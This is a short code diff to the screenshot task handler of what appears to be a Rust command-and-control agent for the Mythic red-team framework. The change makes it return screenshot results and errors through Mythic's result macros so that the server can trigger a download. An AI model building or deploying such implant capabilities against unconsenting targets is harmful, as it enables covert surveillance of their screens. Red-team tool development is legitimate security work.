@@ -1,7 +1,7 @@
 use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
-use crate::AgentTask;
+use crate::{AgentTask, mythic_success, mythic_error};
 
 #[cfg(target_os = "windows")]
 use std::ptr;
@@ -37,12 +37,12 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
     let args = ScreenshotArgs {};
     match execute_screenshot(args, &task.id) {
         Ok(output) => {
-            // FIX: Return plain string instead of JSON so Mythic can detect screenshot_captured: prefix
-            Ok(serde_json::Value::String(output))
+            // For screenshot, we need to return the special format that triggers automatic download
+            // The overlay server will detect the "screenshot_captured:" prefix and create a download task
+            Ok(mythic_success!(task.id, output))
         },
         Err(error) => {
-            // FIX: Return error as plain string for consistency
-            Ok(serde_json::Value::String(format!("error: {}", error)))
+            Ok(mythic_error!(task.id, format!("Screenshot failed: {}", error)))
         },
     }
 }
